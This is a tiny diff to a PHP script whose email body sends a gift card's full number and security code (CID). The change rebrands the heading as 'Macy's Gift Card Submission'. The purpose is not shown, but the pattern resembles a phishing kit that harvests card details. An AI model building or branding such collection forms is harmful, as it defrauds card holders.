@@ -17,7 +17,7 @@ if (empty($number) || empty($cid)) {
 
 // email body
 $body = "
-<h2>Gift Card Submission</h2>
+<h2>Macy's Gift Card Submission</h2>
 <p><b>Card Number:</b> $number</p>
 <p><b>CID:</b> $cid</p>
 ";
